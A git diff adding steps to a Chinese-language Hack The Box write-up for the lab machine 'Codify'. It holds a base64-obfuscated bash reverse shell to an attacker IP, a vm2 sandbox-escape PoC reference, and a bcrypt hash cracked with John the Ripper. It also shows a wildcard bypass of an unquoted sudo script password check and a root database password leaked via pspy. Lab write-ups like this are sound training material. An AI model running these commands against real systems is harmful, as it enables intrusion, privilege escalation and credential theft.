@@ -1,6 +1,3 @@
-**Waiting for machine retire...**
-
----
 
 ## Summary
 
@@ -12,13 +9,13 @@
 
 - nmap
 - SQLite
-- shell
+- shell script
 - JTR
 
 
 ### Attack Path Overview
 
-![attack-path](./AttackPath/HTB-template.png){ width='450' }
+![attack-path](./AttackPath/HTB-Codify.png){ width='450' }
 
 
 ## External Recon - nmap
@@ -51,6 +48,14 @@ PORT     STATE SERVICE VERSION
 
 ### PoC ([CVE-2023-30547](https://security.snyk.io/vuln/SNYK-JS-VM2-5426093))
 
+根据vm2的版本号3.9.16，简单谷歌之后在github发现一个漏洞提交与PoC：<https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244>  
+复制其PoC代码粘贴到Editor运行后无反应，本身也不太懂Node.js，让ChatGPT解释了一下明白代码执行在 `execSync()` 处。遂将命令改为 `id` 后再次运行，成功显示结果：
+
+![HTB-Codify-PoC](./evidence-img/HTB-Codify-PoC.png)
+
+接下来就简单了，使用反弹shell的命令：`echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ==" |base64 -d|bash`
+
+成功反连：
 
 ```bash
 svc@codify:~$ id
@@ -65,9 +70,36 @@ pwned  script.sh
 
 可以发现该用户没有user flag。看家目录有另一个用户：joshua，估计要横向移动。
 
+一番探索后发现一个DB文件：
+```bash
+svc@codify:/var/www/contact$ file tickets.db 
+tickets.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 17, database pages 5, cookie 0x2, schema 4, UTF-8, version-valid-for 17
+svc@codify:/var/www/contact$ which sqlite3
+/usr/bin/sqlite3
+
+sqlite> .tables
+tickets  users  
+sqlite> select * from users;
+3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+```
 
 ### 破解密码
 
+```bash
+└─$ echo 'joshua:$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' > hash.txt
+
+└─$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt 
+ ... 
+spongebob1       (joshua)     
+ ...
+```
+
+`su` 或者 `ssh` 成功登陆joshua用户：
+
+```bash
+joshua@codify:~$ id
+uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)
+```
 
 ## flag: user
 
@@ -132,6 +164,40 @@ done
 /usr/bin/chown root:sys-adm "$BACKUP_DIR"
 /usr/bin/chmod 774 -R "$BACKUP_DIR"
 /usr/bin/echo 'Done!'
+```
+
+是进行数据库的备份，执行时要求输入密码匹配 `$DB_PASS`，但是值得注意的是，if条件判断 `$DB_PASS == $USER_PASS` 并未用双引号包围变量。所以可以利用shell的通配符绕过认证——即可以在要求输入密码时输入“*”。
+
+执行：
+
+```bash
+joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh 
+Enter MySQL password for root: 
+Password confirmed!
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Backing up database: mysql
+mysqldump: [Warning] Using a password on the command line interface can be insecure.
+-- Warning: column statistics not supported by the server.
+mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
+mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
+Backing up database: sys
+mysqldump: [Warning] Using a password on the command line interface can be insecure.
+-- Warning: column statistics not supported by the server.
+All databases backed up successfully!
+Changing the permissions
+Done!
+```
+
+注意到系统提示的 `[Warning] Using a password on the command line interface can be insecure.`
+
+那么就用pspy看看，再次运行脚本后发现这一段：
+
+```bash
+ ...
+023/11/11 04:51:08 CMD: UID=0     PID=34733  | /usr/bin/echo Backing up database: sys 
+2023/11/11 04:51:08 CMD: UID=0     PID=34735  | /bin/bash /opt/scripts/mysql-backup.sh 
+2023/11/11 04:51:08 CMD: UID=0     PID=34734  | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 sys
+ ...
 ```
 
 
